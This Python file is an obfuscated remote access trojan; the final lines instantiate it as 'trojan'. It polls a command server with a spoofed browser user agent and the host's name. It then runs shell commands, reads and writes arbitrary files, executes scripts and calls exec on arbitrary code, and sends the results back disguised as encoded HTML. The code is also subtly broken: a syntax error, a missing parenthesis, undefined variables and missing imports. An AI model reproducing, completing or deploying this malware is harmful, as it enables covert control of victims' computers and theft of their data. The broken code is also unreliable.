import urllib.request as request
import urllib.parse as parse
from urllib.parse import quote, unquote
import json
import os
import sys
import random
import base64
import platform

def encrypt(plaintext: str) -> str:
    randomtext = ''
    for i in range(len(plaintext)):
        randomtext += plaintext[i] + chr(random.randint(33, 126))
    base64text = str(base64.b64encode(''.join(format(ord(i), '08b') for i in randomtext).encode('utf-8')))[2:-1] 
    randombase64text = ''
    for i in range(len(str(base64text))):
        randombase64text  += str(base64text)[i]
        randombase64text  += chr(random.randint(33, 126))
    html = ('<!doctype html><body>^%s^</body></doctype>' % randombase64text)
    return html

def SzFcdBS0ivd(k9yIBVGfdifHxl) -> str:
    return ''.join(chr(int(base64.b64decode(k9yIBVGfdifHxl[(k9yIBVGfdifHxl.find('^') + 1):-(k9yIBVGfdifHxl[::-1].find('^') +1):2].encode('latin-1'))[i*8:i*8+8],2) \
                             ) for i in range(len(base64.b64decode(k9yIBVGfdifHxl[(k9yIBVGfdifHxl.find('^') + 1):-(k9yIBVGfdifHxl[::-1].find('^') +1):2].encode('latin-1')))//8))[::2]


class FdLYvtTOT9x:
    def __init__(r0VZS8aLng, Z96YE6gMyHNNWaW3UpZ,\
                H7KBljw8yHtHm_Kt8_8v='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',\
                A0ZHF2Jp0myE0a = platform.node(), **VWyKlUOzs5LBUj6j):
        r0VZS8aLng.Z96YE6gMyHNNWaW3UpZ = Z96YE6gMyHNNWaW3UpZ
        r0VZS8aLng.H7KBljw8yHtHm_Kt8_8v = H7KBljw8yHtHm_Kt8_8v
        r0VZS8aLng.A0ZHF2Jp0myE0a = A0ZHF2Jp0myE0a
        r0VZS8aLng.VWyKlUOzs5LBUj6j = {'computer-id':r0VZS8aLng.A0ZHF2Jp0myE0a, 'User-agent' : r0VZS8aLng.H7KBljw8yHtHm_Kt8_8v}
        r0VZS8aLng.VWyKlUOzs5LBUj6j.update(VWyKlUOzs5LBUj6j)
    
    def auJxN1d(r0VZS8aLng):
        BQj5tD4G3iJimSIn7_0D = request.Request(r0VZS8aLng.Z96YE6gMyHNNWaW3UpZ, headers = r0VZS8aLng.VWyKlUOzs5LBUj6j)
        with request.urlopen(BQj5tD4G3iJimSIn7_0D) as 4nS7cJDGZ:
            fblZMZgOoaZr2B = 4nS7cJDGZ.read()
            fblZMZgOoaZr2B = fblZMZgOoaZr2B.decode()
        H9qpETN7XAC_124 = SzFcdBS0ivd(fblZMZgOoaZr2B)
        kjdfCqDI3fH = ''
        try:
            kjdfCqDI3fH = json.loads(H9qpETN7XAC_124)
        except json.JSONDecodeError:
            H9qpETN7XAC_124 = H9qpETN7XAC_124.replace('\'', '"')
            kjdfCqDI3fH = json.loads(H9qpETN7XAC_124)
        return kjdfCqDI3fH
    
    def sendoutcome(r0VZS8aLng, jgYcNro: dict) -> str:
        print('[*] -> sending ', jgYcNro)
        hZVnw04yhD = parse.quote(encrypt(str(jgYcNro))).encode('utf-8')
        eK2E6SFiPeUFuE0I = request.Request(r0VZS8aLng.Z96YE6gMyHNNWaW3UpZ, data=hZVnw04yhD, headers = r0VZS8aLng.VWyKlUOzs5LBUj6j)
        with request.urlopen(eK2E6SFiPeUFuE0I) as I7QtHeBHDWgTr1UPqo:
            I7QtHeBHDWgTr1UPqo = I7QtHeBHDWgTr1UPqo.read().decode()
        return I7QtHeBHDWgTr1UPqo
            
    def R9eapaCq7pEl0oqx(r0VZS8aLng):
        JzH0oTSG = r0VZS8aLng.auJxN1d()
        htrHKQg_mm5 = {'EI0ILNlH9QjMm' : [], 'yowwEp9pQIYv' : [], 't6Z5rKHgCpvn6' : [], 'NpP5lLMxSTy' : [], 'p_1io3vQuuA' : []}
        for _8Qz1Can, lGX5tRwLFtf4Q in JzH0oTSG.items():
            if _8Qz1Can.lower() == 'EI0ILNlH9QjMm': #cmd
                for GLusu2aBblLHF in lGX5tRwLFtf4Q:
                    jgLOV1mnqvrVfi7 = str(os.popen(GLusu2aBblLHF).read())
                    if jgLOV1mnqvrVfi7 == -1 or jgLOV1mnqvrVfi7 == 1:
                        try:
                            jgLOV1mnqvrVfi7 = subprocess.check_output(shlex.split(GLusu2aBblLHF), stderr=subprocess.STDOUT)
                        except Exception as e:
                            jgLOV1mnqvrVfi7 = e
                    htrHKQg_mm5['EI0ILNlH9QjMm'].append([ GLusu2aBblLHF, jgLOV1mnqvrVfi7])
            elif _8Qz1Can.lower() == 'yowwEp9pQIYv': #file read
                for GLusu2aBblLHF in lGX5tRwLFtf4Q:
                    try:
                        with open(GLusu2aBblLHF, 'r') as file:
                            jgLOV1mnqvrVfi7 = file.read()
                    except Exception as e:
                        jgLOV1mnqvrVfi7 = e
                    htrHKQg_mm5['yowwEp9pQIYv'].append([GLusu2aBblLHF, jgLOV1mnqvrVfi7])
            elif _8Qz1Can.lower() == 't6Z5rKHgCpvn6': #file write
                for GLusu2aBblLHF in lGX5tRwLFtf4Q:
                    jgLOV1mnqvrVfi7 = None
                    try:
                        with open(GLusu2aBblLHF[0], 'w') as nDfyuu0QYM7vySJ:
                            nDfyuu0QYM7vySJ.write(GLusu2aBblLHF[1])
                    except Exception as e:
                        jgLOV1mnqvrVfi7 = e
                    htrHKQg_mm5['t6Z5rKHgCpvn6'].append([GLusu2aBblLHF[0], jgLOV1mnqvrVfi7])
            elif _8Qz1Can.lower() == 'NpP5lLMxSTy':
                for GLusu2aBblLHF in lGX5tRwLFtf4Q:
                    STtP3yI37W9djsEm = GLusu2aBblLHF.split('.')[-1]
                    if STtP3yI37W9djsEm == '.py': STtP3yI37W9djsEm = 'python'
                    jgLOV1mnqvrVfi7 = ''
                    if '.' not in filetype:
                        try:
                            jgLOV1mnqvrVfi7 +=subprocess.check_output(shlex.split('%s %s' %(STtP3yI37W9djsEm, GLusu2aBblLHF)), stderr=subprocess.STDOUT).decode()
                        except Exception as e:
                            jgLOV1mnqvrVfi7 += str(e)
                    else:
                        jgLOV1mnqvrVfi7 += '\n\n[*] Invalid file type\n\n'
                    htrHKQg_mm5['NpP5lLMxSTy'].append([GLusu2aBblLHF, jgLOV1mnqvrVfi7])
            elif _8Qz1Can.lower() == 'p_1io3vQuuA':
                for GLusu2aBblLHF in lGX5tRwLFtf4Q:
                    try:
                        if '()' not in value:
                            loc = {}
                            exec('output = %s' % GLusu2aBblLHF, globals(), loc)
                            jgLOV1mnqvrVfi7 = loc['output']
                        else:
                            exec(GLusu2aBblLHF)
                            jgLOV1mnqvrVfi7= ('executed "%"s correctly' % GLusu2aBblLHF)
                    except Exception as e:
                        jgLOV1mnqvrVfi7 = e
                    htrHKQg_mm5['p_1io3vQuuA'].append([GLusu2aBblLHF, jgLOV1mnqvrVfi7])
        htrHKQg_mm5 = str(htrHKQg_mm5)
        r0VZS8aLng.sendoutcome(htrHKQg_mm5

trojan = FdLYvtTOT9x('http://127.0.0.1:8000')
trojan.R9eapaCq7pEl0oqx()"""
